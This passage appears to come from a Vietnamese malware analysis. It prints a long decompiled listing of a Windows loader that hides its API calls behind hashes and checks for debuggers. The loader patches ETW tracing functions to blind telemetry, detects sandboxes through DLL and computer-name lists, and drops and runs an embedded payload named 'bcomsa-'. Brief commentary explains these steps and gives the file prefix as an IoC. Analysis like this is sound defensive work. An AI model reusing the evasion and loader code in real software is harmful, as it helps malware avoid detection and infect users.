  pfn_WaitForSingleObject = pfn_WaitForSingleObject_tmp;
  *(_QWORD *)&v147 = 0xB4B429EC901DFD3AuLL;
  pfn_GetExitCodeProcess_tmp = GetProcByHash(a1: hmod_kernel32, a2: 0xB4B429EC901DFD3AuLL);
  if ( pfn_GetExitCodeProcess_tmp == nullptr )
  {
    v5 = 41;
    goto LABEL_8;
  }
  pfn_GetExitCodeProcess = pfn_GetExitCodeProcess_tmp;
  *(_QWORD *)&v147 = 0x7DB7E39CE6FC266CLL;
  pfn_GetCommandLineW = GetProcByHash(a1: hmod_kernel32, a2: 0x7DB7E39CE6FC266CuLL);
  if ( pfn_GetCommandLineW == nullptr )
  {
    v5 = 42;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0x845FEFC85141C3F9uLL;
  if ( GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0x845FEFC85141C3F9uLL) == nullptr )
  {
    v5 = 43;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0x7E4C2837E94925DCLL;
  if ( GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0x7E4C2837E94925DCuLL) == nullptr )
  {
    v5 = 44;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0x8C4A6ECD1D730777uLL;
  if ( GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0x8C4A6ECD1D730777uLL) == nullptr )
  {
    v5 = 45;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0xAF8C5CB639651D7EuLL;
  if ( GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0xAF8C5CB639651D7EuLL) == nullptr )
  {
    v5 = 46;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0x47C5F8A81C7219FALL;
  if ( GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0x47C5F8A81C7219FAuLL) == nullptr )
  {
    v5 = 47;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0xB1652A33D7BB5BAFuLL;
  if ( GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0xB1652A33D7BB5BAFuLL) == nullptr )
  {
    v5 = 48;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0x6E725DD5532C4681LL;
  if ( GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0x6E725DD5532C4681uLL) == nullptr )
  {
    v5 = 49;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0xEA6C7A3147903D0BuLL;
  pfn_GlobalMemoryStatusEx = GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0xEA6C7A3147903D0BuLL);
  if ( pfn_GlobalMemoryStatusEx == nullptr )
  {
    v5 = 50;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0x15BC2DA339AFF299LL;
  pfn_GetSystemInfo = GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0x15BC2DA339AFF299uLL);
  if ( pfn_GetSystemInfo == nullptr )
  {
    v5 = 51;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0xA15BC5CE20682CCBuLL;
  pfn_GetModuleHandleW = GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0xA15BC5CE20682CCBuLL);
  if ( pfn_GetModuleHandleW == nullptr )
  {
    v5 = 52;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0x45CD07A7E8F6290ALL;
  pfn_GetEnvironmentVariableW = GetProcByHash_0(a1: hmod_kernel32, a2: hmod_kernelbase, a3: 0x45CD07A7E8F6290AuLL);
  if ( pfn_GetEnvironmentVariableW == nullptr )
  {
    v5 = 53;
    goto LABEL_8;
  }
  pfn_VirtualAlloc = GetProcByHash(a1: hmod_kernel32, a2: 0xF411A1AB6F73369CuLL);
  pfn_VirtualProtect = GetProcByHash(a1: hmod_kernel32, a2: 0x48F0091B95462B76uLL);
  pfn_NtAllocateVirtualMemory = GetProcByHash(a1: hmod_ntdll, a2: 0xCB6CAE80A6AA7107uLL);
  pfn_NtProtectVirtualMemory = GetProcByHash(a1: hmod_ntdll, a2: 0x7AFFE753E3DE2E0FuLL);
  pfn_NtQueryInformationProcess = GetProcByHash(a1: hmod_ntdll, a2: 0x90680B2D7DD3D3E9uLL);
  *(_QWORD *)&v147 = 0x268767D23C46C108LL;
  pfn_NtSetInformationThread = GetProcByHash(a1: hmod_ntdll, a2: 0x268767D23C46C108uLL);
  v121 = dword_7FF603D65000;
  if ( (dword_7FF603D65000 & 1) != 0 )
  {
    v34 = NtCurrentPeb();
    if ( v34->BeingDebugged != 0
      || (v34->NtGlobalFlag & 0x70) != 0
      || pfn_NtQueryInformationProcess != nullptr
      && (*(_QWORD *)&v147 = 0,
          *(_DWORD *)Buffer = 0,
          ((int (__fastcall *)(__int64, __int64, __int128 *, __int64, WCHAR *))pfn_NtQueryInformationProcess)(
            a1: -1,
            a2: 7,
            a3: &v147,
            a4: 8,
            a5: Buffer) >= 0)
      && (_QWORD)v147 != 0 )
    {
      v5 = 161;
      goto LABEL_8;
    }
  }
  if ( (v121 & 2) == 0 )
  {
LABEL_55:
    if ( pfn_NtSetInformationThread != nullptr && (v121 & 4) != 0 )
      ((void (__fastcall *)(__int64, __int64, _QWORD, _QWORD))pfn_NtSetInformationThread)(a1: -2, a2: 17, a3: 0, a4: 0);
    *(_QWORD *)&v147 = 0xD1C4498B25D4276DuLL;
    pfn_EtwEventWrite_tmp = GetProcByHash(a1: hmod_ntdll, a2: 0xD1C4498B25D4276DuLL);
    if ( pfn_EtwEventWrite_tmp != nullptr )
    {
      pfn_EtwEventWrite = pfn_EtwEventWrite_tmp;
      if ( pfn_VirtualProtect != nullptr )
      {
        LODWORD(v147) = 0;
        ((void (__fastcall *)(char *, __int64, __int64, __int128 *))pfn_VirtualProtect)(
          a1: pfn_EtwEventWrite_tmp,
          a2: 8,
          a3: 64,
          a4: &v147);
      }
      *(_WORD *)pfn_EtwEventWrite = -16333;
      pfn_EtwEventWrite[2] = -61;
    }
    *(_QWORD *)&v147 = 0x430052FA5F47EC24LL;
    pfn_EtwEventWriteFull_tmp = GetProcByHash(a1: hmod_ntdll, a2: 0x430052FA5F47EC24uLL);
    if ( pfn_EtwEventWriteFull_tmp != nullptr )
    {
      pfn_EtwEventWriteFull = pfn_EtwEventWriteFull_tmp;
      if ( pfn_VirtualProtect != nullptr )
      {
        LODWORD(v147) = 0;
        ((void (__fastcall *)(char *, __int64, __int64, __int128 *))pfn_VirtualProtect)(
          a1: pfn_EtwEventWriteFull_tmp,
          a2: 8,
          a3: 64,
          a4: &v147);
      }
      *(_WORD *)pfn_EtwEventWriteFull = -16333;
      pfn_EtwEventWriteFull[2] = -61;
    }
    *(_QWORD *)&v147 = 0x16723849E96223F1LL;
    pfn_NtTraceEvent_tmp = GetProcByHash(a1: hmod_ntdll, a2: 0x16723849E96223F1uLL);
    if ( pfn_NtTraceEvent_tmp != nullptr )
    {
      pfn_NtTraceEvent = pfn_NtTraceEvent_tmp;
      if ( pfn_VirtualProtect != nullptr )
      {
        LODWORD(v147) = 0;
        ((void (__fastcall *)(char *, __int64, __int64, __int128 *))pfn_VirtualProtect)(
          a1: pfn_NtTraceEvent_tmp,
          a2: 8,
          a3: 64,
          a4: &v147);
      }
      *(_WORD *)pfn_NtTraceEvent = -16333;
      pfn_NtTraceEvent[2] = -61;
    }
    v107 = nullptr;
    if ( pfn_NtAllocateVirtualMemory != nullptr && pfn_NtProtectVirtualMemory != nullptr )
    {
      v28 = sub_7FF603D63505(a1: (unsigned __int64)hmod_ntdll, a2: pfn_NtAllocateVirtualMemory);
      v111 = v29;
      v30 = sub_7FF603D63505(a1: (unsigned __int64)hmod_ntdll, a2: pfn_NtProtectVirtualMemory);
      v118 = v31;
      v107 = nullptr;
      if ( v28 == 1 && (v30 & 1) != 0 )
      {
        v107 = nullptr;
        v32 = 0;
        while ( 1 )
        {
          v33 = &pfn_NtAllocateVirtualMemory[v32];
          if ( &pfn_NtAllocateVirtualMemory[v32] >= (char *)hmod_ntdll
            && *v33 == 15
            && pfn_NtAllocateVirtualMemory[v32 + 1] == 5
            && pfn_NtAllocateVirtualMemory[v32 + 2] == -61 )
          {
            break;
          }
          if ( ++v32 == 64 )
            goto LABEL_80;
        }
        if ( pfn_VirtualAlloc != nullptr )
        {
          v107 = nullptr;
          v56 = ((__int64 (__fastcall *)(_QWORD, __int64, __int64, __int64))pfn_VirtualAlloc)(
                  a1: 0,
                  a2: 4096,
                  a3: 12288,
                  a4: 64);
          if ( v56 != 0 )
          {
            v57 = (int (__fastcall *)(__int64, _QWORD *, _QWORD))v56;
            *(_DWORD *)v56 = -1194226868;
            *(_DWORD *)(v56 + 4) = v111;
            *(_WORD *)(v56 + 8) = 9727;
            *(_DWORD *)(v56 + 10) = 0;
            *(_QWORD *)(v56 + 14) = v33;
            *(_DWORD *)(v56 + 32) = -1194226868;
            *(_DWORD *)(v56 + 36) = v118;
            *(_WORD *)(v56 + 40) = 9727;
            *(_DWORD *)(v56 + 42) = 0;
            *(_QWORD *)(v56 + 46) = v33;
            if ( pfn_VirtualProtect != nullptr )
              ((void (__fastcall *)(__int64, __int64, __int64, _QWORD))pfn_VirtualProtect)(
                a1: v56,
                a2: 4096,
                a3: 32,
                a4: 0);
            v107 = v57;
          }
        }
        else
        {
          v107 = nullptr;
        }
      }
    }
LABEL_80:
    if ( ((unsigned int (__fastcall *)(_QWORD, void *, __int64))pfn_GetModuleFileNameW)(
           a1: 0,
           a2: &unk_7FF603D65D1C,
           a3: 512) == 0 )
    {
      v5 = 2;
      goto LABEL_8;
    }
    v35 = ((__int64 (__fastcall *)(void *, __int64, __int64, _QWORD, int, int, _QWORD))pfn_CreateFileW)(
            a1: &unk_7FF603D65D1C,
            a2: 0x80000000LL,
            a3: 7,
            a4: 0,
            a5: 3,
            a6: 128,
            a7: 0);
    if ( v35 == -1 )
    {
      v5 = 3;
      goto LABEL_8;
    }
    v36 = v35;
    v125 = 0;
    ((void (__fastcall *)(__int64, signed __int64 *))pfn_GetFileSizeEx)(a1: v35, a2: &v125);
    if ( (unsigned __int64)(v125 - 536870913) < 0xFFFFFFFFE0000100uLL )
    {
      ((void (__fastcall *)(__int64))pfn_CloseHandle)(a1: v36);
      v5 = 4;
      goto LABEL_8;
    }
    v45 = sub_7FF603D6366C(
            a1: v125 + 16,
            a2: v107,
            a3: (__int64 (__fastcall *)(_QWORD, __int64, __int64, __int64))pfn_VirtualAlloc);
    if ( v45 == 0 )
    {
      ((void (__fastcall *)(__int64))pfn_CloseHandle)(a1: v36);
LABEL_110:
      v5 = 5;
      goto LABEL_8;
    }
    v46 = v45;
    v47 = v125;
    for ( i = 0; (__int64)i < v125; v47 = v125 )
    {
      v49 = v47 - i;
      if ( v49 >= 0x1000000 )
        v49 = 0x1000000;
      LODWORD(v147) = 0;
      if ( ((unsigned int (__fastcall *)(__int64, unsigned __int64, __int64, __int128 *, _QWORD))pfn_ReadFile)(
             a1: v36,
             a2: v46 + i,
             a3: v49,
             a4: &v147,
             a5: 0) == 0 )
        break;
      if ( (_DWORD)v147 == 0 )
        break;
      i += (unsigned int)v147;
    }
    ((void (__fastcall *)(__int64))pfn_CloseHandle)(a1: v36);
    if ( i != v125 )
    {
      v5 = 6;
      goto LABEL_8;
    }
    v135 = 0x6EE91D537B46B9B7LL;
    v50 = i - 88;
    v51 = i + v46 - 8;
    for ( j = v46 + i - 88; ; --j )
    {
      v53 = v46 + v50;
      for ( k = 0; k != 8; ++k )
      {
        if ( *(_BYTE *)(j + k) != *((_BYTE *)&v135 + k) )
          goto LABEL_123;
      }
      if ( (unsigned int)(*(_DWORD *)(v53 + 8) - 2) <= 0xE )
        break;
LABEL_123:
      v55 = v50-- == 0;
      if ( v55 )
        goto LABEL_133;
      --v51;
    }
    if ( v50 == -1 )
    {
LABEL_133:
      v5 = 7;
      goto LABEL_8;
    }
    v65 = *(unsigned int *)(v53 + 12);
    v115 = *(_QWORD *)(v53 + 16);
    v112 = *(_QWORD *)(v53 + 24);
    if ( v112 < 0x10 || (unsigned int)(v65 - 7) < 0xFFFFFFFA || v115 < 0x10 )
    {
LABEL_147:
      v5 = 8;
      goto LABEL_8;
    }
    v146 = *(_OWORD *)v53;
    qmemcpy(nSize, (const void *)(v53 + 32), 24);
    v66 = v50 + 80;
    v168 = 0;
    v167 = 0;
    v67 = 0;
    do
    {
      if ( v66 + 32 * v67 + 32 > i )
        goto LABEL_147;
      for ( m = 0; m != 32; ++m )
        *((_BYTE *)&v167 + m) ^= *(_BYTE *)(v51 + m);
      ++v67;
      v51 += 32;
    }
    while ( v67 != v65 );
    v108 = (_BYTE *)sub_7FF603D6366C(
                      a1: v115 + 16,
                      a2: v107,
                      a3: (__int64 (__fastcall *)(_QWORD, __int64, __int64, __int64))pfn_VirtualAlloc);
    if ( v108 == nullptr )
      goto LABEL_110;
    v69 = 32 * v65;
    v119 = v115 - 16;
    if ( (unsigned __int8)sub_7FF603D62A7C(
                            a1: &v167,
                            a2: (__int64)nSize,
                            a3: (__int64)&v146,
                            a4: v69 + v66 + v46,
                            a5: v115,
                            a6: (__int64)v108,
                            a7: v115 - 16) == 0
      || *v108 != 77
      || v108[1] != 90 )
    {
      v5 = 9;
      goto LABEL_8;
    }
    v113 = v112 + v69 + v115 + 80;
    v70 = __rdtsc();
    v116 = v70;
    v71 = HIDWORD(v70);
    v72 = (unsigned __int64)NtCurrentPeb();
    v138 = 0;
    *(_OWORD *)Buffer = 0;
    for ( n = 0; n != 12; ++n )
      Buffer[n] = (unsigned __int8)aDlllocalappdat[n + 4];
    WORD4(v138) = 0;
    sub_7FF603D63A76(a1: &v147, a2: 0, a3: 600);
    v74 = ((__int64 (__fastcall *)(WCHAR *, __int128 *, __int64))pfn_GetEnvironmentVariableW)(
            a1: Buffer,
            a2: &v147,
            a3: 300);
    if ( v74 - 1 >= 0x103 )
    {
      v80 = ((__int64 (__fastcall *)(__int64, __int16 *))pfn_GetTempPathW)(a1: 512, a2: word_7FF603D658BC);
      if ( v80 - 501 <= 0xFFFFFE0B )
      {
        v5 = 10;
        goto LABEL_8;
      }
      v79 = v80;
    }
    else
    {
      v75 = v74;
      v76 = v74;
      sub_7FF603D63A63(a1: word_7FF603D658BC, a2: &v147, a3: v76 * 2);
      for ( ii = 0; ii != 29; ++ii )
      {
        v78 = ii;
        word_7FF603D658BC[ii + v76] = (unsigned __int8)aDlllocalappdat[ii + 16];
      }
      v79 = v75 + v78 + 1;
    }
    v81 = v72 ^ ((v71 << 32) | v116);
    qmemcpy(v124, "bcomsa-", 7);
    v82 = &word_7FF603D658BC[v79];
    for ( jj = 0; jj != 7; ++jj )
      *v82++ = *((unsigned __int8 *)v124 + jj);
    v84 = v79 + 15;
    for ( kk = 0; kk != 32; kk += 4 )
    {
      v86 = (v81 >> kk) & 0xF;
      v87 = v86 + 87;
      if ( (unsigned __int16)v86 < 0xAu )
        v87 = v86 + 48;
      *v82++ = v87;
    }
    *(_QWORD *)Buffer = ".dat.tmp.bin.log.cache";
    *(_QWORD *)&Buffer[4] = 4;
    *(_QWORD *)&v138 = ".tmp.bin.log.cache";
    *((_QWORD *)&v138 + 1) = 4;
    *(_QWORD *)&v139 = ".bin.log.cache";
    *((_QWORD *)&v139 + 1) = 4;
    *(_QWORD *)&v140 = ".log.cache";
    *((_QWORD *)&v140 + 1) = 4;
    *(_QWORD *)&v141 = ".cache";
    *((_QWORD *)&v141 + 1) = 6;
    v88 = 8
        * ((unsigned int)(v81 >> 8) - 5 * (unsigned int)((0x3333333333333334LL * (unsigned __int128)(v81 >> 8)) >> 64));
    v89 = *(_QWORD *)&Buffer[v88 + 4];
    if ( v89 != 0 )
    {
      v90 = *(_QWORD *)&Buffer[v88];
      v84 = v79 + v89 + 15;
      for ( mm = 0; mm != v89; ++mm )
        *v82++ = *(unsigned __int8 *)(v90 + mm);
    }
    word_7FF603D658BC[v84] = 0;
    v92 = ((__int64 (__fastcall *)(__int16 *, __int64, __int64, _QWORD, int, _DWORD, _QWORD))pfn_CreateFileW)(
            a1: word_7FF603D658BC,
            a2: 0x40000000,
            a3: 7,
            a4: 0,
            a5: 2,
            a6: 0,
            a7: 0);
    if ( v92 == -1 )
    {
      v5 = 11;
    }
    else
    {
      v93 = v92;
      v136 = 0;
      ((void (__fastcall *)(__int64, _BYTE *, unsigned __int64, int *, _QWORD))pfn_WriteFile)(
        a1: v92,
        a2: v108,
        a3: v119,
        a4: &v136,
        a5: 0);
      ((void (__fastcall *)(__int64, unsigned __int64, __int64, int *, _QWORD))pfn_WriteFile)(
        a1: v93,
        a2: v53,
        a3: v113,
        a4: &v136,
        a5: 0);
      ((void (__fastcall *)(__int64))pfn_CloseHandle)(a1: v93);
      word_7FF603D65024[0] = 34;
      v94 = word_7FF603D658BC[0];
      for ( nn = 1; v94 != 0; ++nn )
      {
        word_7FF603D65024[nn] = v94;
        v94 = word_7FF603D658BC[nn];
      }
      word_7FF603D65024[nn] = 34;
      v96 = nn + 1;
      v97 = ((__int64 (*)(void))pfn_GetCommandLineW)();
      for ( i1 = 0; ; ++i1 )
      {
        v99 = *(unsigned __int16 *)(v97 + 2 * i1);
        if ( v99 != 32 )
          break;
      }
      if ( v99 == 34 )
      {
        do
        {
          v100 = i1++;
          v101 = *(unsigned __int16 *)(v97 + 2 * v100 + 2);
        }
        while ( v101 != 34 && *(_WORD *)(v97 + 2 * v100 + 2) != 0 );
        v102 = v100 + 2;
        if ( (_WORD)v101 == 34 )
          i1 = v102;
      }
      else
      {
        while ( (v99 & 0xFFDF) != 0 )
          LOWORD(v99) = *(_WORD *)(v97 + 2 * i1++ + 2);
      }
      for ( i2 = (__int16 *)(v97 + 2 * i1 + 2); *(i2 - 1) == 32; ++i2 )
        ++i1;
      if ( *(i2 - 1) != 0 )
      {
        word_7FF603D65024[nn + 1] = 32;
        v104 = nn + 2;
        v105 = *(_WORD *)(v97 + 2 * i1);
        if ( v105 == 0 || v104 >= 0x44A )
        {
          v96 = v104;
        }
        else
        {
          do
          {
            word_7FF603D65024[v104] = v105;
            v96 = v104 + 1;
            v105 = *i2;
            if ( *i2 == 0 )
              break;
            ++i2;
            v55 = v104++ < 0x449;
          }
          while ( v55 );
        }
      }
      word_7FF603D65024[v96] = 0;
      Sleep(dwMilliseconds: __rdtsc() % 0x5DC);
      v153 = 0;
      v152 = 0;
      v151 = 0;
      v150 = 0;
      v149 = 0;
      *(_OWORD *)v148 = 0;
      v147 = 0;
      v164 = 0;
      *(_QWORD *)&v165 = 0;
      LODWORD(v147) = 104;
      if ( ((unsigned int (__fastcall *)(__int16 *, __int16 *, _QWORD, _QWORD, _DWORD, int, _QWORD, _QWORD, __int128 *, __int128 *))pfn_CreateProcessW)(
             a1: word_7FF603D658BC,
             a2: word_7FF603D65024,
             a3: 0,
             a4: 0,
             a5: 0,
             a6: 0x8000000,
             a7: 0,
             a8: 0,
             a9: &v147,
             a10: &v164) != 0 )
      {
        Sleep(dwMilliseconds: 0x1F40u);
        ((void (__fastcall *)(__int16 *))pfn_DeleteFileW)(a1: word_7FF603D658BC);
        v122 = 0;
        if ( ((unsigned int (__fastcall *)(_QWORD, _QWORD))pfn_WaitForSingleObject)(a1: v164, a2: 0) == 0 )
          ((void (__fastcall *)(_QWORD, UINT *))pfn_GetExitCodeProcess)(a1: v164, a2: &v122);
        ((void (__fastcall *)(_QWORD))pfn_CloseHandle)(a1: *((_QWORD *)&v164 + 1));
        ((void (__fastcall *)(_QWORD))pfn_CloseHandle)(a1: v164);
        v5 = v122;
      }
      else
      {
        ((void (__fastcall *)(__int16 *))pfn_DeleteFileW)(a1: word_7FF603D658BC);
        v5 = 18;
      }
    }
LABEL_8:
    exitproc(a1: v5);
  }
  v167 = 0;
  v170 = 0;
  v169 = 0;
  v168 = 0;
  LODWORD(v167) = 64;
  if ( ((unsigned int (__fastcall *)(__int128 *))pfn_GlobalMemoryStatusEx)(a1: &v167) == 0
    || *((_QWORD *)&v167 + 1) >> 31 != 0 )
  {
    v166 = 0;
    v165 = 0;
    v164 = 0;
    ((void (__fastcall *)(__int128 *))pfn_GetSystemInfo)(a1: &v164);
    if ( (unsigned int)v166 >= 2 )
    {
      v148[0] = "sbiedll.dllapi_log.dlldir_watch.dllpstorec.dllvmcheck.dllwpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvbox"
                "mrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v148[1] = 11;
      *(_QWORD *)&v149 = "api_log.dlldir_watch.dllpstorec.dllvmcheck.dllwpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      *((_QWORD *)&v149 + 1) = 11;
      *(_QWORD *)&v150 = "dir_watch.dllpstorec.dllvmcheck.dllwpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      *((_QWORD *)&v150 + 1) = 13;
      *(_QWORD *)&v151 = "pstorec.dllvmcheck.dllwpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      *((_QWORD *)&v151 + 1) = 11;
      *(_QWORD *)&v152 = "vmcheck.dllwpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      *((_QWORD *)&v152 + 1) = 11;
      *(_QWORD *)&v153 = "wpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      *((_QWORD *)&v153 + 1) = 10;
      v154 = "cmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v155 = 12;
      v156 = "snxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v157 = 9;
      v158 = "vboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v159 = 12;
      v160 = "vboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v161 = 13;
      v162 = "sxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v163 = 8;
      for ( i3 = 0; i3 != 11; ++i3 )
      {
        v38 = v148[2 * i3];
        v39 = v148[2 * i3 + 1];
        v140 = 0;
        v139 = 0;
        v138 = 0;
        *(_OWORD *)Buffer = 0;
        if ( v39 != 0 )
        {
          for ( i4 = 0; i4 != v39; ++i4 )
          {
            if ( i4 == 32 )
              goto LABEL_107;
            Buffer[i4] = *(unsigned __int8 *)(v38 + i4);
          }
          if ( v39 > 0x1F )
LABEL_107:
            ExitProc();
        }
        Buffer[v39] = 0;
        if ( ((__int64 (__fastcall *)(WCHAR *))pfn_GetModuleHandleW)(a1: Buffer) != 0 )
          goto LABEL_91;
      }
      v144 = 0;
      v143 = 0;
      v142 = 0;
      v141 = 0;
      v140 = 0;
      v139 = 0;
      v138 = 0;
      *(_OWORD *)Buffer = 0;
      nSize[0] = 64;
      if ( GetComputerNameW(lpBuffer: Buffer, nSize) )
      {
        v148[0] = "sandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
        v148[1] = 7;
        *(_QWORD *)&v149 = "malwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
        *((_QWORD *)&v149 + 1) = 7;
        *(_QWORD *)&v150 = "viruscuckooanalysiswdagutilitymaltesttequilabomb";
        *((_QWORD *)&v150 + 1) = 5;
        *(_QWORD *)&v151 = "cuckooanalysiswdagutilitymaltesttequilabomb";
        *((_QWORD *)&v151 + 1) = 6;
        *(_QWORD *)&v152 = "analysiswdagutilitymaltesttequilabomb";
        *((_QWORD *)&v152 + 1) = 8;
        *(_QWORD *)&v153 = "wdagutilitymaltesttequilabomb";
        *((_QWORD *)&v153 + 1) = 11;
        v154 = "maltesttequilabomb";
        v155 = 7;
        v156 = "tequilabomb";
        v157 = 11;
        v58 = 0;
        while ( 1 )
        {
          v59 = 2 * v58;
          v60 = v148[2 * v58 + 1];
          if ( v60 == 0 )
            break;
          ++v58;
          v61 = v148[v59];
          v62 = 0;
          while ( 1 )
          {
            if ( v62 == 64 )
              goto LABEL_107;
            v63 = Buffer[v62];
            if ( v63 == 0 )
              break;
            v64 = v63 | 0x20;
            if ( (unsigned __int16)(v63 - 65) >= 0x1Au )
              v64 = Buffer[v62];
            if ( v64 != *(unsigned __int8 *)(v61 + v62) )
              break;
            if ( v60 == ++v62 )
              goto LABEL_91;
          }
          if ( v58 == 8 )
            goto LABEL_105;
        }
      }
      else
      {
LABEL_105:
        v41 = __rdtsc();
        v42 = (unsigned __int64)(unsigned int)-HIDWORD(v41) << 32;
        v43 = (unsigned int)v41;
        v44 = __rdtsc();
        *(_QWORD *)&v147 = 499500;
        if ( v42 - v43 + ((unsigned __int64)HIDWORD(v44) << 32) + (unsigned int)v44 <= 0x7A1200 )
          goto LABEL_55;
      }
    }
  }
LABEL_91:
  v5 = 162;
  goto LABEL_8;
}
```
Cụm:
```c
pfn_EtwEventWrite_tmp = GetProcByHash(a1: hmod_ntdll, a2: 0xD1C4498B25D4276DuLL);
    if ( pfn_EtwEventWrite_tmp != nullptr )
    {
      pfn_EtwEventWrite = pfn_EtwEventWrite_tmp;
      if ( pfn_VirtualProtect != nullptr )
      {
        LODWORD(v147) = 0;
        ((void (__fastcall *)(char *, __int64, __int64, __int128 *))pfn_VirtualProtect)(
          a1: pfn_EtwEventWrite_tmp,
          a2: 8,
          a3: 64,
          a4: &v147);
      }
      *(_WORD *)pfn_EtwEventWrite = -16333;
      pfn_EtwEventWrite[2] = -61;
    }
    *(_QWORD *)&v147 = 0x430052FA5F47EC24LL;
    pfn_EtwEventWriteFull_tmp = GetProcByHash(a1: hmod_ntdll, a2: 0x430052FA5F47EC24uLL);
    if ( pfn_EtwEventWriteFull_tmp != nullptr )
    {
      pfn_EtwEventWriteFull = pfn_EtwEventWriteFull_tmp;
      if ( pfn_VirtualProtect != nullptr )
      {
        LODWORD(v147) = 0;
        ((void (__fastcall *)(char *, __int64, __int64, __int128 *))pfn_VirtualProtect)(
          a1: pfn_EtwEventWriteFull_tmp,
          a2: 8,
          a3: 64,
          a4: &v147);
      }
      *(_WORD *)pfn_EtwEventWriteFull = -16333;
      pfn_EtwEventWriteFull[2] = -61;
    }
    *(_QWORD *)&v147 = 0x16723849E96223F1LL;
    pfn_NtTraceEvent_tmp = GetProcByHash(a1: hmod_ntdll, a2: 0x16723849E96223F1uLL);
    if ( pfn_NtTraceEvent_tmp != nullptr )
    {
      pfn_NtTraceEvent = pfn_NtTraceEvent_tmp;
      if ( pfn_VirtualProtect != nullptr )
      {
        LODWORD(v147) = 0;
        ((void (__fastcall *)(char *, __int64, __int64, __int128 *))pfn_VirtualProtect)(
          a1: pfn_NtTraceEvent_tmp,
          a2: 8,
          a3: 64,
          a4: &v147);
      }
      *(_WORD *)pfn_NtTraceEvent = -16333;
      pfn_NtTraceEvent[2] = -61;
    }
```
Thực hiện vô hiệu hóa ETW (ETW sẽ được cập nhật sau).
Đoạn tiếp theo là thực hiện đọc chính file thực thi, trích xuất payload tại marker `0x6EE91D537B46B9B7` và ghi vào file mới.
```c
qmemcpy(v124, "bcomsa-", 7);
```
Lệnh này thực hiện thêm đoạn tiền tố `bcomsa-` vào tên file (như đã thấy trong log procmon), đây là một IoC chất lượng.
Đoạn này:
```c
if ( (unsigned int)v166 >= 2 )
    {
      v148[0] = "sbiedll.dllapi_log.dlldir_watch.dllpstorec.dllvmcheck.dllwpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvbox"
                "mrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v148[1] = 11;
      *(_QWORD *)&v149 = "api_log.dlldir_watch.dllpstorec.dllvmcheck.dllwpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      *((_QWORD *)&v149 + 1) = 11;
      *(_QWORD *)&v150 = "dir_watch.dllpstorec.dllvmcheck.dllwpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      *((_QWORD *)&v150 + 1) = 13;
      *(_QWORD *)&v151 = "pstorec.dllvmcheck.dllwpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      *((_QWORD *)&v151 + 1) = 11;
      *(_QWORD *)&v152 = "vmcheck.dllwpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      *((_QWORD *)&v152 + 1) = 11;
      *(_QWORD *)&v153 = "wpespy.dllcmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      *((_QWORD *)&v153 + 1) = 10;
